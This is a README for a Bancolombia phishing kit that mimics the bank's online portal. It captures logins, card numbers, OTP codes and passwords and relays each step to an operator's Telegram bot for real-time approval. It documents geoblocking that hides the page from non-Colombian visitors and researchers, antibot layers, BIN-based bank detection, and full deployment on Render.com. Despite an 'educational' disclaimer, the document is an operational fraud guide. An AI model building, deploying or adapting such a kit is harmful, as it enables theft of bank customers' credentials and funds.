# Bancolombia Sucursal Virtual Personas — Flujo Completo v2

Sistema de simulación de phishing bancario con flujo de 5 pasos, aprobación manual vía Telegram Bot, protección antibot integrada, detección de banco por BIN y backend proxy seguro.

---

## 📁 Estructura del Proyecto

```
bancolombia_flow_v2/
│
├── Antibot.php              ← Clase PHP de protección contra bots
├── config.php               ← Credenciales de Telegram (EDITAR)
├── index.php                ← Punto de entrada (SPA con 6 pantallas)
├── .htaccess                ← Protección de archivos + headers seguridad
├── README.md                ← Este archivo
│
├── api/
│   ├── .htaccess            ← Restricciones de acceso
│   ├── send.php             ← Envía mensajes a Telegram desde backend
│   ├── poll.php             ← Consulta estado de aprobación
│   ├── bin.php              ← Detección de banco por BIN
│   └── geo.php              ← Geolocalización IP y bloqueo por país
│
├── data/
│   └── .htaccess            ← Denegar acceso público
│
├── assets/
│   ├── css/
│   │   └── style.css        ← Estilos completos
│   └── js/
│       └── app.js           ← Lógica frontend
│
└── img/
    └── banks/
        ├── bancolombia.png
        ├── davivienda.png
        ├── bbva.png
        ├── bogota.png
        ├── colpatria.png
        ├── avvillas.png
        ├── itau.png
        ├── popular.png
        ├── falabella.png
        ├── cajasocial.png
        ├── serfinanza.png
        ├── nequi.png
        ├── visa.png
        ├── master.png
        └── defaultcard.png
```

---

## 🚀 Instalación

### Requisitos
- PHP 7.4+ (preferiblemente 8.0+)
- Extensión `curl` habilitada
- Extensión `session` habilitada
- Servidor web (Apache, Nginx, LiteSpeed)

### Pasos

1. **Sube los archivos** a tu servidor web.

2. **Configura Telegram** en `config.php`:
   ```php
   return [
       'bot_token' => 'TU_TOKEN_DEL_BOTFATHER',
       'chat_id'   => '-100XXXXXXXXXX'
   ];
   ```

3. **Crea el bot de Telegram**:
   - Abre [@BotFather](https://t.me/BotFather)
   - Crea bot con `/newbot`
   - Copia el token

4. **Obtén el Chat ID**:
   - Añade el bot a tu grupo
   - Envía un mensaje
   - Visita: `https://api.telegram.org/bot<TOKEN>/getUpdates`
   - Busca `"chat":{"id":-5427694909`

5. **Accede al flujo**:
   ```
   https://tudominio.com/bancolombia_flow_v2/index.php
   ```

---

## 🚀 Despliegue en Render.com (IMPORTANTE)

⚠️ **NO uses "Static Site". Este proyecto usa PHP, necesita "Web Service".**

### Paso 1: Subir a GitHub

Sube los archivos del ZIP a tu repositorio:
```bash
cd bancolombia_flow_v2/
git init
git add .
git commit -m "Ready for Render"
git remote add origin https://github.com/TU_USUARIO/bancolombia.git
git push -u origin main
```

### Paso 2: Crear Web Service (NO Static Site)

1. Entra a [dashboard.render.com](https://dashboard.render.com)
2. Arriba a la derecha clic en **New +**
3. Selecciona **Web Service** ←── NO "Static Site"
4. Conecta tu cuenta de GitHub y selecciona el repo `bancolombia`
5. Render detecta el `Dockerfile` automáticamente

### Paso 3: Configurar campos

Rellena así exactamente:

| Campo | Valor |
|-------|-------|
| **Name** | `bancolombia` (o el que quieras) |
| **Region** | `Oregon (US West)` |
| **Branch** | `main` |
| **Root Directory** | (dejar vacío) |
| **Runtime** | `Docker` (lo detecta solo) |
| **Plan** | `Free` |

> No aparecerá "Build Command" ni "Publish Directory" porque Docker se encarga de todo.

### Paso 4: Variables de Entorno

Ve a la pestaña **Environment** y añade estas 2:

| Key | Value |
|-----|-------|
| `BOT_TOKEN` | Tu token real de BotFather |
| `CHAT_ID` | Tu chat ID del grupo (ej: `-1001234567890`) |

Haz clic en **Add Environment Variable** para cada una.

### Paso 5: Deploy

1. Clic en **Deploy Web Service** (abajo de todo)
2. Espera 2-3 minutos a que Render construya la imagen Docker
3. Tu URL será: `https://bancolombia.onrender.com`

### ¿Por qué no Static Site?

- **Static Site** solo sirve HTML/CSS/JS plano. No ejecuta PHP.
- **Web Service** ejecuta el contenedor Docker con PHP 8.2 + Apache.
- Tu proyecto tiene archivos `.php` (`api/send.php`, `api/poll.php`, etc.) que necesitan PHP para funcionar.

### Archivos de Render incluidos
- `Dockerfile` — Imagen con PHP 8.2 + Apache + mod_rewrite
- `start.sh` — Script que lee el puerto `$PORT` que Render asigna
- `render.yaml` — Blueprint de infraestructura (opcional)
- `.dockerignore` — Excluye archivos innecesarios

---

## 🌍 Geobloqueo por IP

Si la IP del visitante **no es de Colombia**, se redirige automáticamente a:
```
https://www.bancolombia.com/personas
```

### Reglas de bloqueo:
| Condición | Acción |
|-----------|--------|
| IP extranjera detectada | Redirigir inmediatamente |
| Más de 2 IPs extranjeras únicas | Redirigir (protección contra rastreo) |
| IP detectada como proxy/VPN/hosting | Redirigir |
| IP local (127.0.0.1) | Permitir (desarrollo) |

### Funcionamiento:
1. Al cargar `index.php`, se consulta `ip-api.com` para obtener el país de la IP
2. Se guarda en sesión PHP para contar IPs únicas
3. Si no es Colombia, envía `header("Location: ...")` antes de mostrar cualquier contenido

### Personalizar link de redirección:
Edita `index.php` y cambia la URL en la función `checkGeoBlock()`:
```php
return "https://www.tulink.com";
```

---

## 🔒 Sistema Antibot (4 capas)

| Capa | Descripción |
|------|-------------|
| **Honeypot** | Campo `website` invisible. Bots lo llenan → rechazado. |
| **Token de sesión** | `ab_token` único por sesión, se rota tras cada uso. |
| **Tiempo mínimo** | Rechaza si envían en < 2 segundos. |
| **Checkbox** | "No soy un robot" validado en frontend + backend. |

---

## 🏦 Detección de Banco por BIN

Al escribir el número de tarjeta, se detecta automáticamente:
- **Franquicia**: Visa / Mastercard / Amex (por primer dígito)
- **Banco**: Bancolombia, Davivienda, BBVA, etc. (por BIN de 6 dígitos)

Logos mostrados en tiempo real sobre el formulario.

---

## 📱 Flujo de 6 Pasos

```
┌─────────┐     ┌─────────┐     ┌─────────┐     ┌─────────┐     ┌─────────┐     ┌─────────┐
│  LOGIN  │ ──→ │  CUPO   │ ──→ │ TARJETA │ ──→ │  TOKEN  │ ──→ │  CLAVE  │ ──→ │ ÉXITO   │
└─────────┘     └─────────┘     └─────────┘     └─────────┘     └─────────┘     └─────────┘
     │               │               │               │               │
     ▼               ▼               ▼               ▼               ▼
  Telegram       Telegram       Telegram       Telegram       Telegram
  Aprobar/      Aprobar/       Aprobar/       Aprobar/       Aprobar/
  Token/        Rechazar       OTP/           Rechazar       Rechazar
  Rechazar                     Dinámica/
                               Rechazar
```

### Botones de Telegram por paso:

**Login:**
- ✅ Aprobar → avanza a Cupo
- 🏦 Token → pide token adicional
- ❌ Rechazar → toast error + limpia campos

**Tarjeta:**
- ✅ Aprobar → avanza a Clave Dinámica
- 🔐 OTP → pide código OTP
- 💳 Dinámica → salta directo a Clave Dinámica
- ❌ Rechazar → toast error + limpia campos

**Otros pasos:**
- ✅ Aprobar / ❌ Rechazar

---

## 🛡️ Backend Proxy Seguro

El **token de Telegram NUNCA viaja al frontend**.

```
Frontend JS ──POST──→ api/send.php ──cURL──→ Telegram API
     ↑                    ↑
     └────GET poll───────┘
```

- `api/send.php` recibe datos, valida antibot, envía a Telegram, guarda sesión.
- `api/poll.php` consulta Telegram getUpdates, actualiza sesiones, devuelve acción.
- Sesiones guardadas en archivos JSON en `data/` (protegido por .htaccess).

---

## ⚙️ Personalización

### Cambiar montos del cupo (index.php)
```html
<div class="opt" data-val="5">$5.000.000</div>
<div class="opt" data-val="100">$100.000.000</div>
```

### Añadir nuevos BINs (api/bin.php)
```php
$binMap = [
    '451340' => 'bancolombia',
    'NUEVO'  => 'minuevo',
];
```

### Cambiar tiempo antibot (Antibot.php)
```php
if ($tiempo < 2)   // mínimo 2 segundos
if ($tiempo > 1800) // máximo 30 minutos
```

---

## 🔧 Troubleshooting

### "Falta configurar Telegram"
Edita `config.php` con credenciales reales.

### Mensajes no llegan a Telegram
```bash
curl -X POST "https://api.telegram.org/bot<TOKEN>/sendMessage" \
  -d "chat_id=<CHAT_ID>&text=Prueba"
```

### "Solicitud bloqueada por seguridad"
- No llenes el campo `website` (honeypot invisible)
- Espera al menos 2 segundos antes de enviar
- Marca el checkbox "No soy un robot"

### Botón no se activa
Debes completar: Usuario + Clave + Checkbox.

---

## 📄 Licencia

Fines educativos y de prueba de seguridad. Uso indebido bajo responsabilidad del usuario.

---

## 📝 Changelog

### v2.0
- **Geobloqueo por IP**: Bloquea IPs extranjeras y redirige automáticamente
- **Backend proxy**: Token de Telegram oculto en servidor
- **Detección BIN**: Auto-detecta banco y franquicia por número de tarjeta
- **Múltiples botones**: Token, OTP, Dinámica, Aprobar, Rechazar
- **Nueva pantalla**: Token de seguridad
- **Rotación de token**: One-time token antibot
- **Detección de dispositivo**: Enviado a Telegram

### v1.0
- Flujo completo de 5 pasos
- Integración directa con Telegram desde frontend
- Sistema antibot básico
- Toast de error estilo Bancolombia
# bancolombia_flow_v2
